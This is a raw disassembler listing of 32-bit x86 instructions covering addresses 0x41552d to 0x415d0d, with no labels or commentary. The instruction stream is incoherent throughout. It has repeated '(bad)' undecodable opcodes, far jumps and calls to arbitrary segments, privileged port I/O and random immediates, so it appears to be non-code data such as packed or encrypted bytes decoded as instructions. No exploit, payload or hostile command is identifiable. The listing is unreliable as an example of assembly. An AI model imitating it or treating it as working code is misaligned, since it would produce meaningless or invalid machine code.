  41552d:	cmp    al,BYTE PTR [ecx]
  41552f:	into   
  415530:	mov    ch,0x5
  415532:	mov    esp,ds
  415534:	and    BYTE PTR [eax-0x70],al
  415537:	pop    ds
  415538:	add    BYTE PTR [eax+eiz*2],ch
  41553b:	mov    WORD PTR [edi],?
  41553d:	lahf   
  41553e:	pop    ebx
  41553f:	push   es
  415540:	mov    ch,0x5
  415542:	pop    ebx
  415543:	mov    ebx,0x6b4fe1f3
  415548:	mov    ah,0xf3
  41554a:	mov    DWORD PTR [ebx+0x5e9f4a12],ebp
  415550:	dec    edx
  415551:	mov    fs,WORD PTR [edi]
  415553:	jp     0x4154f9
  415555:	cmp    bh,BYTE PTR [esi]
  415557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415558:	pop    esi
  415559:	adc    eax,0xe0a820b6
  41555e:	and    eax,0xa990decc
  415563:	adc    ch,BYTE PTR [edx+eiz*8]
  415566:	xchg   esi,eax
  415567:	adc    ecx,DWORD PTR [edi+ecx*1]
  41556a:	rcr    ch,0x2f
  41556d:	push   ebx
  41556e:	call   0x91a0:0x41f1874f
  415575:	fwait
  415576:	mov    edx,0x59172ea0
  41557b:	gs push es
  41557d:	cmp    al,0x39
  41557f:	pop    ss
  415580:	add    DWORD PTR [esi],esi
  415582:	add    BYTE PTR [ecx+ebx*8+0x1c],bl
  415586:	scas   al,BYTE PTR es:[edi]
  415587:	pop    ss
  415588:	sub    esi,ecx
  41558a:	and    al,0xad
  41558c:	inc    edx
  41558d:	call   FWORD PTR [eax-0x69273226]
  415593:	rcl    ah,cl
  415595:	sbb    dl,BYTE PTR [ecx]
  415597:	jle    0x41554a
  415599:	xchg   edx,eax
  41559a:	cld    
  41559b:	(bad)  
  41559d:	xchg   ecx,eax
  41559e:	test   eax,0x9ea786b2
  4155a3:	std    
  4155a4:	cmp    dl,0x53
  4155a7:	pop    esi
  4155a8:	cli    
  4155a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155aa:	xchg   BYTE PTR [esi],bl
  4155ac:	ss jne 0x4155fc
  4155af:	mov    esp,esp
  4155b1:	push   es
  4155b2:	mov    WORD PTR [edx+0x75],?
  4155b5:	adc    DWORD PTR [ecx-0x38ee3fa6],ebx
  4155bb:	sbb    dh,BYTE PTR [edi-0x53]
  4155be:	pop    esp
  4155bf:	sub    BYTE PTR [esp+esi*2],ah
  4155c2:	xchg   esi,eax
  4155c3:	adc    edi,DWORD PTR [esi+0x40]
  4155c6:	cwde   
  4155c7:	and    al,0x9e
  4155c9:	push   ebx
  4155ca:	lahf   
  4155cb:	jl     0x415615
  4155cd:	jg     0x4155da
  4155cf:	pop    es
  4155d0:	es popa 
  4155d2:	mov    ecx,0xb04877c5
  4155d7:	jmp    0x1cf28390
  4155dc:	sbb    ah,BYTE PTR [eax+0x5f]
  4155df:	stos   DWORD PTR es:[edi],eax
  4155e0:	in     al,0xce
  4155e2:	mov    ebx,0xf9f16347
  4155e7:	test   eax,0xefdda6d4
  4155ec:	push   edi
  4155ed:	gs cdq 
  4155ef:	add    DWORD PTR [edi-0x69509232],ebx
  4155f5:	mov    ebx,0x3b597aeb
  4155fa:	mov    ecx,DWORD PTR [esi+0x53cdd071]
  415600:	and    al,BYTE PTR [esi+0x2f16a5d8]
  415606:	push   cs
  415607:	xlat   BYTE PTR ds:[ebx]
  415608:	stos   BYTE PTR es:[edi],al
  415609:	jmp    0x66b4:0xbf866a33
  415610:	aas    
  415611:	pop    ecx
  415612:	imul   edi
  415614:	imul   eax,DWORD PTR [ebx+0x376c92fc],0xdf62b6
  41561e:	jbe    0x7190cbb2
  415624:	idiv   DWORD PTR [ecx+0x50]
  415627:	ins    BYTE PTR es:[edi],dx
  415628:	pop    ecx
  415629:	lods   eax,DWORD PTR ds:[esi]
  41562a:	push   ecx
  41562b:	sbb    eax,0xf4c41005
  415630:	jmp    0x68ef7c1a
  415635:	dec    ecx
  415636:	in     eax,dx
  415637:	in     al,0x73
  415639:	pop    esp
  41563a:	call   0x581c19ed
  41563f:	dec    edi
  415640:	xor    eax,0x40f58aa6
  415645:	icebp  
  415646:	les    edx,FWORD PTR [edi+0x74]
  415649:	repz push cs
  41564b:	mov    ecx,0x3e3b7345
  415650:	pushw  ds
  415652:	inc    ecx
  415653:	inc    ebp
  415654:	xor    dl,BYTE PTR [esi]
  415656:	out    dx,al
  415657:	mov    eax,ds:0xe80416e5
  41565c:	scas   eax,DWORD PTR es:[edi]
  41565d:	and    DWORD PTR [ebx],edx
  41565f:	popa   
  415660:	add    esi,edx
  415662:	iret   
  415663:	es in  al,dx
  415665:	mov    eax,ds:0xffc92a21
  41566a:	cmp    DWORD PTR [edi+0x1],edi
  41566d:	in     al,dx
  41566e:	and    al,dl
  415670:	cmp    esp,edx
  415672:	jne    0x4156d8
  415674:	imul   DWORD PTR [bp+di+0x5d86]
  415679:	cmc    
  41567a:	add    eax,0x691d1c74
  41567f:	dec    ebp
  415680:	ins    BYTE PTR es:[edi],dx
  415681:	xchg   ecx,eax
  415682:	xchg   dl,cl
  415684:	fmul   QWORD PTR [esi+0x1e3b40dd]
  41568a:	jmp    DWORD PTR [ebx]
  41568c:	in     al,dx
  41568d:	in     eax,dx
  41568e:	xchg   esi,eax
  41568f:	sub    DWORD PTR [ebx],edx
  415691:	xor    eax,0xe486f90e
  415696:	lds    eax,FWORD PTR [ecx]
  415698:	cdq    
  415699:	mov    eax,ds:0x7bb83e93
  41569e:	xchg   ebp,eax
  41569f:	adc    al,0xc
  4156a1:	cmp    ah,BYTE PTR [edi+0x39]
  4156a4:	adc    ebx,edi
  4156a6:	pop    es
  4156a7:	jae    0x415705
  4156a9:	dec    esp
  4156aa:	inc    esi
  4156ab:	arpl   WORD PTR [eax-0x26],sp
  4156ae:	inc    eax
  4156af:	sar    DWORD PTR [edi+0x47],1
  4156b2:	mov    esi,0xb367a22
  4156b7:	xchg   esp,eax
  4156b8:	sbb    al,0xd1
  4156ba:	pop    ds
  4156bb:	and    eax,0x7111c28a
  4156c0:	aam    0xc5
  4156c2:	iret   
  4156c3:	(bad)  
  4156c4:	jns    0x415647
  4156c6:	pusha  
  4156c7:	add    al,0xd2
  4156c9:	sahf   
  4156ca:	and    dl,BYTE PTR cs:[ebp+0x47f80ef6]
  4156d1:	repnz idiv edi
  4156d4:	pop    edi
  4156d5:	sub    al,0x62
  4156d7:	lea    edx,[esi-0x2b]
  4156da:	mov    ebx,0x25d1e0e8
  4156df:	add    DWORD PTR gs:[ecx+0x4f],eax
  4156e3:	lods   eax,DWORD PTR ds:[esi]
  4156e4:	outs   dx,BYTE PTR ds:[esi]
  4156e5:	mov    DWORD PTR [esi-0x42506890],esp
  4156eb:	es repz enter 0xc257,0xe6
  4156f1:	ret    0x28a5
  4156f4:	int    0xbd
  4156f6:	ins    BYTE PTR es:[edi],dx
  4156f7:	neg    BYTE PTR [ecx-0x3d]
  4156fa:	add    al,0xb6
  4156fc:	aas    
  4156fd:	jle    0x415730
  4156ff:	mov    al,0x5d
  415701:	aad    0x22
  415703:	inc    ecx
  415704:	push   esp
  415705:	repnz mov WORD PTR [ebp-0x73],?
  415709:	and    eax,0xb5e4d8ea
  41570e:	pop    edx
  41570f:	sti    
  415710:	shl    DWORD PTR [ecx+0x70],1
  415713:	xchg   esi,eax
  415714:	adc    al,ch
  415716:	sub    al,0xe9
  415718:	add    BYTE PTR [ebp-0x2a29d8c7],bl
  41571e:	inc    esi
  41571f:	push   ebp
  415720:	xchg   edx,eax
  415721:	fisub  WORD PTR [ebx]
  415723:	aam    0x6
  415725:	sbb    ah,BYTE PTR [ecx+ebx*8-0x650ed9f]
  41572c:	test   eax,0x5f5b2c74
  415731:	jl     0x4157a2
  415733:	adc    BYTE PTR [edi],ah
  415735:	fcmove st,st(4)
  415737:	mov    gs,WORD PTR [edx-0x23]
  41573a:	outs   dx,DWORD PTR ds:[esi]
  41573b:	cmc    
  41573c:	jnp    0x4156fb
  41573e:	and    bl,BYTE PTR [ebx+eax*1]
  415741:	cmp    ebx,DWORD PTR [eax-0x405d4f3]
  415747:	aas    
  415748:	jne    0x415708
  41574a:	out    dx,al
  41574b:	jg     0x415791
  41574d:	jmp    0x7aeae381
  415752:	pop    eax
  415753:	dec    edi
  415754:	fisttp WORD PTR [esp+ecx*1]
  415757:	adc    eax,0xe054ece2
  41575c:	add    esp,DWORD PTR ds:0x4ee3cae2
  415762:	out    dx,al
  415763:	cmp    cl,BYTE PTR [esi]
  415765:	dec    edi
  415766:	pop    es
  415767:	mov    DWORD PTR [esi],ebx
  415769:	inc    esp
  41576a:	out    0x50,al
  41576c:	mov    esi,0x48e0cbcd
  415771:	jb     0x4157e0
  415773:	inc    ecx
  415774:	jb     0x4157b3
  415776:	fdiv   st(6),st
  415778:	fsubr  QWORD PTR [ebp-0x33]
  41577b:	adc    eax,0x1b0cd340
  415780:	push   ds
  415781:	jecxz  0x41575d
  415783:	jnp    0x415706
  415785:	ret    
  415786:	pop    esp
  415787:	scas   al,BYTE PTR es:[edi]
  415788:	mov    eax,ds:0x533e81f1
  41578d:	das    
  41578e:	sti    
  41578f:	push   esp
  415790:	or     BYTE PTR [ebx],0x6c
  415793:	and    DWORD PTR [ebp-0x38],edx
  415796:	cli    
  415797:	fnstcw WORD PTR [eax+0x6e]
  41579a:	mov    cl,0x28
  41579c:	push   eax
  41579d:	xchg   ebx,eax
  41579e:	push   edx
  41579f:	icebp  
  4157a0:	cmp    BYTE PTR [ebp-0x57],bl
  4157a3:	mov    cs,WORD PTR [esp+eax*8+0x4a]
  4157a7:	je     0x4157e1
  4157a9:	test   BYTE PTR [ecx+0x59],bh
  4157ac:	jg     0x415829
  4157ae:	inc    ebp
  4157af:	in     al,0x6f
  4157b1:	or     DWORD PTR [ecx+0x72],esp
  4157b4:	or     al,0x98
  4157b6:	leave  
  4157b7:	add    bl,BYTE PTR [ebx+0x43]
  4157ba:	dec    esi
  4157bb:	mov    ch,0x7
  4157bd:	cwde   
  4157be:	sub    cl,BYTE PTR ds:0x60a7e087
  4157c4:	mov    al,0x9d
  4157c6:	enter  0x22d3,0x37
  4157ca:	push   eax
  4157cb:	test   eax,ecx
  4157cd:	mov    al,0x87
  4157cf:	int3   
  4157d0:	popa   
  4157d1:	(bad)  
  4157d2:	in     al,0x8b
  4157d4:	ror    esi,0xfc
  4157d7:	xchg   BYTE PTR [ebx+eiz*4+0x134c9f9b],bh
  4157de:	pop    ds
  4157df:	or     al,0xc3
  4157e1:	or     esp,DWORD PTR [ecx]
  4157e3:	daa    
  4157e4:	mov    eax,0xc84503c5
  4157e9:	mov    ebp,0xb9e4eef
  4157ee:	pop    ss
  4157ef:	int3   
  4157f0:	bound  esp,QWORD PTR [ebp-0x52cffc73]
  4157f6:	fst    DWORD PTR [edi+0x1b]
  4157f9:	xor    esi,edi
  4157fb:	(bad)  
  4157fc:	dec    edi
  4157fd:	pop    eax
  4157fe:	sbb    eax,0xfa05cb8d
  415803:	ror    cl,0x4a
  415806:	xchg   ebp,eax
  415807:	xchg   ebp,eax
  415808:	cwde   
  415809:	loopne 0x415829
  41580b:	sub    al,0x87
  41580d:	lahf   
  41580e:	rcl    edx,1
  415810:	and    eax,DWORD PTR [esp+eax*1]
  415813:	arpl   WORD PTR [ecx],di
  415815:	frstpm(287 only) 
  415817:	push   edx
  415818:	cwde   
  415819:	mov    cl,BYTE PTR [edx]
  41581b:	in     eax,dx
  41581c:	test   al,0xa6
  41581e:	stc    
  41581f:	jnp    0x41589b
  415821:	adc    eax,0x159d456f
  415826:	mov    ds:0x2e6427c6,al
  41582b:	dec    ebx
  41582c:	mov    WORD PTR [esp+edx*1+0x44],ds
  415830:	ja     0x4157d6
  415832:	xor    al,0x40
  415834:	mov    al,ds:0x1eaba09
  415839:	add    BYTE PTR [edi+0x1f91134c],ah
  41583f:	arpl   WORD PTR [edx+edx*4],bx
  415842:	(bad)  
  415843:	mov    ebp,0xcb9fe162
  415848:	dec    edi
  415849:	mov    ebx,0x220cad65
  41584e:	jo     0x415861
  415850:	into   
  415851:	adc    DWORD PTR [edi+eiz*2-0x7f21ce42],edx
  415858:	ins    BYTE PTR es:[edi],dx
  415859:	mov    esi,0xac754197
  41585e:	push   esi
  41585f:	jge    0x4158cd
  415861:	push   es
  415862:	std    
  415863:	mov    ecx,0x5752c8d8
  415868:	inc    edx
  415869:	fwait
  41586a:	lds    ecx,FWORD PTR [edx+0x47]
  41586d:	dec    edi
  41586e:	mov    edx,0x6a17eff5
  415873:	push   es
  415874:	dec    esp
  415875:	and    DWORD PTR [edi],esi
  415877:	imul   edi,DWORD PTR [ebp-0x65],0x94f060ac
  41587e:	out    dx,eax
  41587f:	pop    esp
  415880:	addr16 dec esp
  415882:	pushf  
  415883:	mov    ebx,0xf805c29e
  415888:	rcl    dh,0x1d
  41588b:	cmp    eax,0x51622a40
  415890:	div    BYTE PTR [eax+0x4035085a]
  415896:	fist   WORD PTR [eax]
  415898:	add    eax,0xef3879b7
  41589d:	xchg   ebx,eax
  41589e:	cmp    DWORD PTR [ebp-0x1bfd2078],ebx
  4158a4:	xor    BYTE PTR [ebp-0x2c],ah
  4158a7:	inc    ebx
  4158a8:	sbb    eax,0x9c7e168a
  4158ad:	aam    0x51
  4158af:	mov    cl,0x92
  4158b1:	adc    BYTE PTR [esi+0x2f],al
  4158b4:	scas   eax,DWORD PTR es:[edi]
  4158b5:	(bad)  
  4158b7:	(bad)  
  4158b8:	cmp    BYTE PTR cs:[ebx-0x54],bh
  4158bc:	shl    DWORD PTR [ebp*4+0x2329abcd],0x5a
  4158c4:	ds aas 
  4158c6:	sub    al,0x24
  4158c8:	loope  0x4158e9
  4158ca:	in     al,dx
  4158cb:	adc    al,0x70
  4158cd:	sbb    cl,BYTE PTR [esi-0x3e]
  4158d0:	cmp    BYTE PTR [ebx+0x1fca496d],ch
  4158d6:	sbb    cl,BYTE PTR [edx+0x76]
  4158d9:	aad    0x44
  4158db:	xchg   ebp,eax
  4158dc:	repnz shr DWORD PTR [ebp+eax*4-0x6e5b655f],cl
  4158e4:	in     al,0x85
  4158e6:	xor    BYTE PTR [edi+0x162f1c60],ch
  4158ec:	sti    
  4158ed:	and    DWORD PTR [ecx+0x57],ecx
  4158f0:	rcl    DWORD PTR [eax+0x19c71270],0xd
  4158f7:	mov    ebp,0x5b71b363
  4158fc:	fimul  DWORD PTR [edi+ecx*2-0xb]
  415900:	sub    cl,BYTE PTR [ebx-0x72]
  415903:	xchg   edx,eax
  415904:	mov    ah,0xe2
  415906:	aam    0xc8
  415908:	ja     0x4158ee
  41590a:	jae    0x415921
  41590c:	hlt    
  41590d:	mov    esp,0xfded488c
  415912:	setnp  BYTE PTR [edi]
  415915:	sub    eax,0xaa4b1acc
  41591a:	inc    esp
  41591b:	out    dx,eax
  41591c:	stos   DWORD PTR es:[edi],eax
  41591d:	dec    esp
  41591e:	aam    0x8c
  415920:	ins    DWORD PTR es:[edi],dx
  415921:	inc    eax
  415922:	repz mov bh,0x83
  415925:	test   DWORD PTR [ebx+0x1e340040],esp
  41592b:	loope  0x415919
  41592d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41592e:	les    edx,FWORD PTR [edi]
  415930:	xchg   esi,eax
  415931:	popa   
  415932:	popf   
  415933:	adc    eax,DWORD PTR [esi+0x56da0069]
  415939:	call   0x4526e045
  41593e:	adc    al,0xe5
  415940:	pushf  
  415941:	add    BYTE PTR [edx],cl
  415943:	loop   0x4158f7
  415945:	fwait
  415946:	push   ebp
  415947:	and    al,0x60
  415949:	fwait
  41594a:	sbb    al,0xef
  41594c:	loope  0x415991
  41594e:	cmp    al,0x65
  415950:	cmp    eax,0x278f8147
  415955:	mov    al,0xdd
  415957:	jge    0x4159aa
  415959:	add    ebp,ebp
  41595b:	mov    WORD PTR [ecx],?
  41595d:	jbe    0x415948
  41595f:	sar    BYTE PTR [edx+0x3fdc89c3],1
  415965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415966:	adc    al,0xb8
  415968:	outs   dx,BYTE PTR ds:[esi]
  415969:	ja     0x41596c
  41596b:	inc    ebp
  41596c:	add    dh,dh
  41596e:	sbb    al,0x3a
  415970:	mov    ebp,0x40d433ff
  415975:	push   esp
  415976:	sbb    esp,DWORD PTR [ebx-0xecdd91f]
  41597c:	add    eax,0xca28e592
  415981:	adc    al,0xc4
  415983:	push   ss
  415984:	adc    bl,ch
  415986:	hlt    
  415987:	test   eax,0xfced86df
  41598c:	push   edx
  41598d:	mov    edx,0x673d894b
  415992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415993:	sbb    al,0xa7
  415995:	mov    al,0x96
  415997:	jnp    0x4159f0
  415999:	sbb    DWORD PTR [edi-0x7b],ebx
  41599c:	test   eax,0x8346e54a
  4159a1:	icebp  
  4159a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159a3:	push   ds
  4159a4:	mov    BYTE PTR [edx-0x5d6c5d71],bl
  4159aa:	or     edi,DWORD PTR [esi]
  4159ac:	ffree  st(2)
  4159ae:	aam    0xff
  4159b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159b1:	jnp    0x415939
  4159b3:	les    edi,FWORD PTR [eax]
  4159b5:	int3   
  4159b6:	lock dec esi
  4159b8:	cmp    BYTE PTR [edx+0x65a0f37],bh
  4159be:	xchg   DWORD PTR [edx],esp
  4159c0:	in     eax,dx
  4159c1:	fmul   QWORD PTR [ecx+0x285c5092]
  4159c7:	int3   
  4159c8:	or     al,0x31
  4159ca:	jmp    0x270c:0xcca7489
  4159d1:	and    edx,esi
  4159d3:	push   edi
  4159d4:	mov    ds:0xb57389de,al
  4159d9:	das    
  4159da:	cmp    ah,bl
  4159dc:	mov    ds:0x499a4403,al
  4159e1:	add    al,0x3b
  4159e3:	jmp    0x9c3a:0x1ed34cf7
  4159ea:	xchg   ebx,eax
  4159eb:	sub    al,0xc5
  4159ed:	daa    
  4159ee:	or     eax,0x60b8cdf8
  4159f3:	jb     0x415a69
  4159f5:	nop
  4159f6:	push   0x9
  4159f8:	call   0x18a0af6d
  4159fd:	pop    DWORD PTR [edx]
  4159ff:	mov    dh,0x47
  415a01:	ja     0x415a32
  415a03:	pop    edx
  415a04:	dec    ecx
  415a05:	mov    ds,WORD PTR [edi-0x16fd39f0]
  415a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a0c:	jo     0x41599e
  415a0e:	cmova  ebx,DWORD PTR [ebx+ebp*1+0x57]
  415a13:	xchg   ebp,eax
  415a14:	mov    esp,0x40953bfe
  415a19:	in     al,0x6d
  415a1b:	add    al,0xaa
  415a1d:	fidiv  WORD PTR [eax-0x71f553ac]
  415a23:	mov    esp,0xed4476ee
  415a28:	ss sti 
  415a2a:	lahf   
  415a2b:	pop    es
  415a2c:	stos   DWORD PTR es:[edi],eax
  415a2d:	inc    ebx
  415a2e:	aam    0xf0
  415a30:	xor    ecx,DWORD PTR [esi+0x70]
  415a33:	das    
  415a34:	sar    edi,0x24
  415a37:	mov    al,ds:0x9b6768b
  415a3c:	adc    ah,BYTE PTR [esi-0x6c4960c6]
  415a42:	sub    BYTE PTR fs:[edx],ah
  415a45:	pop    ebx
  415a46:	outs   dx,DWORD PTR ds:[esi]
  415a47:	sbb    al,0x54
  415a49:	push   edi
  415a4a:	(bad)  
  415a4b:	in     al,0x10
  415a4d:	cwde   
  415a4e:	cmp    dh,BYTE PTR [eax-0x1c]
  415a51:	jne    0x415aaf
  415a53:	push   cs
  415a54:	jge    0x415a0d
  415a56:	or     DWORD PTR [eax+0x515986a2],esi
  415a5c:	out    0x5b,al
  415a5e:	fisubr DWORD PTR [ecx+ebp*1+0x42e77028]
  415a65:	or     bl,dh
  415a67:	jg     0x4159fb
  415a69:	test   dl,bh
  415a6b:	test   eax,0xba7d5632
  415a70:	sbb    ecx,edx
  415a72:	retf   0xd42c
  415a75:	mov    ds:0xa850fa30,al
  415a7a:	loopne 0x415a8e
  415a7c:	xchg   DWORD PTR [ebx],eax
  415a7e:	cmp    DWORD PTR [edx-0x56f55a50],ebp
  415a84:	mov    esp,0x1a364bcf
  415a89:	mov    ebp,DWORD PTR [edx]
  415a8b:	les    ebx,FWORD PTR [esi]
  415a8d:	xchg   DWORD PTR [edi+0x2c],edx
  415a90:	push   cs
  415a91:	and    eax,0x2ba5adf
  415a96:	and    ebx,ecx
  415a98:	fidiv  DWORD PTR [eax-0x39]
  415a9b:	aas    
  415a9c:	fsub   st,st(6)
  415a9e:	mov    esi,0x46456758
  415aa3:	xor    esi,DWORD PTR [ebx]
  415aa5:	inc    edi
  415aa6:	xor    DWORD PTR [edi-0x3f5309b8],ecx
  415aac:	xor    cl,cl
  415aae:	js     0x415a40
  415ab0:	mov    ebx,0x5b33ef26
  415ab5:	loop   0x415ae6
  415ab7:	mov    cl,0x20
  415ab9:	and    DWORD PTR [edi-0x54],esi
  415abc:	or     DWORD PTR [edx-0x15],ecx
  415abf:	stos   DWORD PTR es:[edi],eax
  415ac0:	jecxz  0x415b07
  415ac2:	popf   
  415ac3:	xor    cl,BYTE PTR [eax+0x1f]
  415ac6:	icebp  
  415ac7:	jmp    0x415b2b
  415ac9:	jle    0x415a7f
  415acb:	push   edx
  415acc:	aas    
  415acd:	out    dx,al
  415ace:	mov    al,ds:0xa8648dcd
  415ad3:	sar    BYTE PTR [edi-0x5f1f4bf1],0x50
  415ada:	fnstenv [eax+0x5f]
  415add:	ja     0x415a69
  415adf:	mov    ebx,es
  415ae1:	pop    edx
  415ae2:	and    al,0xd8
  415ae4:	outs   dx,BYTE PTR ds:[esi]
  415ae5:	(bad)  
  415ae6:	stc    
  415ae7:	add    al,BYTE PTR [edx]
  415ae9:	push   eax
  415aea:	mov    eax,0xfdbc24f2
  415aef:	ja     0x415b51
  415af1:	mov    ch,0x66
  415af3:	jg     0x415b4f
  415af5:	leave  
  415af6:	inc    si
  415af8:	sbb    DWORD PTR [eax],esp
  415afa:	stos   BYTE PTR es:[edi],al
  415afb:	xchg   ecx,eax
  415afc:	or     BYTE PTR [edi-0x2d],dh
  415aff:	shr    esp,cl
  415b01:	push   esp
  415b02:	cs sub eax,0x2137487c
  415b08:	aam    0xfd
  415b0a:	adc    BYTE PTR [esp+edi*1+0x600e8f3b],dh
  415b11:	loop   0x415b33
  415b13:	push   ebx
  415b14:	std    
  415b15:	push   ds
  415b16:	test   DWORD PTR [ebx+0x6f],esp
  415b19:	push   es
  415b1a:	push   ds
  415b1b:	inc    ebp
  415b1c:	jae    0x415acc
  415b1e:	test   eax,0x9a936d2a
  415b23:	adc    eax,0xd5d50bad
  415b28:	xchg   ecx,eax
  415b29:	cmp    eax,0x36d1b9a8
  415b2e:	jl     0x415af3
  415b30:	mov    cx,0x8aac
  415b34:	xchg   ebp,eax
  415b35:	fnstenv [edx+0x472082b3]
  415b3b:	push   ebp
  415b3c:	sbb    bl,BYTE PTR ds:0xb5fef468
  415b42:	inc    edx
  415b43:	mov    ebp,0x8dfccd1f
  415b48:	jge    0x415b9c
  415b4a:	mov    eax,0xfb0de07
  415b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b50:	mov    ds:0x83e86f42,al
  415b55:	pop    esi
  415b56:	add    al,0xde
  415b58:	cmovp  esi,DWORD PTR [ebx-0x71]
  415b5c:	or     eax,0x46a28e56
  415b61:	arpl   si,cx
  415b63:	arpl   WORD PTR ds:0x366b9ae1,bx
  415b69:	push   ds
  415b6a:	add    dh,BYTE PTR [eax-0x12]
  415b6d:	dec    ecx
  415b6e:	repz push ebx
  415b70:	cmc    
  415b71:	dec    edi
  415b72:	cwde   
  415b73:	out    dx,eax
  415b74:	adc    eax,0xb091aec3
  415b79:	dec    edx
  415b7a:	pop    eax
  415b7b:	cmp    al,bh
  415b7d:	or     ecx,DWORD PTR [ecx+0x18]
  415b80:	ret    0x631f
  415b83:	inc    esp
  415b84:	jbe    0x3fe28110
  415b8a:	iret   
  415b8b:	adc    DWORD PTR [ebx+eiz*8],edx
  415b8e:	and    BYTE PTR [ebp-0x2acdd483],ah
  415b94:	imul   DWORD PTR [edi-0x1ba70cf8]
  415b9a:	popa   
  415b9b:	fist   DWORD PTR [ebx-0x7]
  415b9e:	jmp    0x7dcb4758
  415ba3:	push   edi
  415ba4:	sub    bx,WORD PTR [esp+esi*4+0x74]
  415ba9:	dec    ebx
  415baa:	out    0xeb,al
  415bac:	sbb    BYTE PTR [ebx],ch
  415bae:	cdq    
  415baf:	push   esp
  415bb0:	(bad)  
  415bb1:	cli    
  415bb2:	mov    ds:0xd1acab6e,al
  415bb7:	es cmp edx,ebx
  415bba:	push   0x882469b
  415bbf:	int3   
  415bc0:	add    al,0xe0
  415bc2:	pop    edx
  415bc3:	inc    ebx
  415bc4:	sub    ebp,DWORD PTR [ebp-0x7b]
  415bc7:	cmp    dh,BYTE PTR [ecx]
  415bc9:	or     al,0xc0
  415bcb:	and    eax,0x6aff124d
  415bd0:	cdq    
  415bd1:	icebp  
  415bd2:	xor    DWORD PTR [eax+0x34767d49],esi
  415bd8:	cmp    ebp,DWORD PTR [esp+ebp*2]
  415bdb:	add    eax,DWORD PTR [ebx]
  415bdd:	sbb    bh,BYTE PTR [eax-0x77]
  415be0:	sbb    eax,0xcdace340
  415be5:	and    BYTE PTR ds:0xcc4d4b67,0x2
  415bec:	lahf   
  415bed:	mov    ah,0xab
  415bef:	lea    eax,[edi-0x6e]
  415bf2:	sub    bl,al
  415bf4:	(bad)  
  415bf5:	xor    BYTE PTR [edi],dh
  415bf7:	fs jne 0x415bdd
  415bfa:	ss push eax
  415bfc:	shl    eax,1
  415bfe:	xchg   ebp,eax
  415bff:	stos   DWORD PTR es:[edi],eax
  415c00:	inc    ebp
  415c01:	call   0x1d12d70a
  415c06:	push   edi
  415c07:	xor    DWORD PTR [ebp-0x4e],edi
  415c0a:	bound  esi,QWORD PTR [ebx+0x3d]
  415c0d:	and    al,0xae
  415c0f:	push   edx
  415c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c11:	mov    DWORD PTR [ebp-0x256e6ca],ebp
  415c17:	aaa    
  415c18:	mov    dh,0xbf
  415c1a:	ja     0x415c68
  415c1c:	or     eax,0xbb2b534a
  415c21:	shr    BYTE PTR [esi+edi*8+0x68d14aa0],0xb7
  415c29:	cmc    
  415c2a:	sub    ah,BYTE PTR [esi]
  415c2c:	adc    al,0xc8
  415c2e:	dec    ecx
  415c2f:	pop    ecx
  415c30:	sbb    eax,0xd82b8ab
  415c35:	xchg   ebx,eax
  415c36:	mov    cl,0x92
  415c38:	gs iret 
  415c3a:	jmp    0x415c36
  415c3c:	dec    ebp
  415c3d:	or     al,0x32
  415c3f:	(bad)
  415c43:	inc    edi
  415c44:	cmp    edx,DWORD PTR [eax+edi*1]
  415c47:	add    BYTE PTR [ecx],0xb
  415c4a:	mov    ebx,0xeb156cbe
  415c4f:	je     0x415c1d
  415c51:	lock and eax,0x9e6300d
  415c57:	in     al,dx
  415c58:	icebp  
  415c59:	mov    edx,0x9d50ef48
  415c5e:	cld    
  415c5f:	stos   DWORD PTR es:[edi],eax
  415c60:	mov    ah,dh
  415c62:	mov    eax,fs
  415c64:	test   BYTE PTR [edx-0x4b],bl
  415c67:	xor    DWORD PTR [ebx+0x7f],ebp
  415c6a:	mov    edx,0xa0af416e
  415c6f:	sub    eax,0x49a17f7
  415c74:	adc    cl,bl
  415c76:	cmp    ecx,DWORD PTR [edx]
  415c78:	sbb    al,0x4
  415c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c7b:	dec    esp
  415c7c:	sbb    esp,DWORD PTR [edx-0xdd7a14d]
  415c82:	or     eax,ecx
  415c84:	retf   
  415c85:	fsubp  st(1),st
  415c87:	sub    ah,dl
  415c89:	mov    esi,0x8a981937
  415c8e:	jns    0x415cac
  415c90:	jecxz  0x415c98
  415c92:	sbb    esi,ebp
  415c94:	imul   ebx,ebp,0xffffffbf
  415c97:	add    edi,DWORD PTR [eax+0x6c53e97f]
  415c9d:	and    ecx,0xff710d9f
  415ca3:	jne    0x415c54
  415ca5:	in     eax,0xaf
  415ca7:	repz sti 
  415ca9:	sbb    esp,DWORD PTR [esi]
  415cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cac:	fwait
  415cad:	ret    0x5d9b
  415cb0:	jb     0x415c3e
  415cb2:	sub    cl,dl
  415cb4:	jne    0x415ca6
  415cb6:	scas   eax,DWORD PTR es:[edi]
  415cb7:	mov    ah,0xa5
  415cb9:	xchg   ecx,eax
  415cba:	in     eax,dx
  415cbb:	rol    BYTE PTR [ebx],0xa8
  415cbe:	jmp    0x6788:0x98b22429
  415cc5:	test   edx,ecx
  415cc7:	(bad)  
  415cc8:	cmp    al,0x98
  415cca:	pop    edx
  415ccb:	cmp    DWORD PTR [edx+ebp*8-0x6a],0xd77997ae
  415cd3:	pop    DWORD PTR [ecx-0x1ce4505b]
  415cd9:	sti    
  415cda:	loopne 0x415d27
  415cdc:	and    BYTE PTR [esi],ah
  415cde:	hlt    
  415cdf:	xor    eax,0xa557806d
  415ce4:	je     0x415d60
  415ce6:	lock mov bl,0x66
  415ce9:	cwde   
  415cea:	sbb    ebp,DWORD PTR [esi+ecx*2-0x55]
  415cee:	outs   dx,BYTE PTR ds:[esi]
  415cef:	xchg   edx,eax
  415cf0:	ret    0x464b
  415cf3:	or     DWORD PTR cs:[ebx-0x32282596],0xbcc0d5e4
  415cfe:	jle    0x415d6f
  415d00:	mov    bh,0x7a
  415d02:	jmp    0x46a401d5
  415d07:	test   DWORD PTR ds:0xede73bc5,ebx
  415d0d:	and    al,0x37
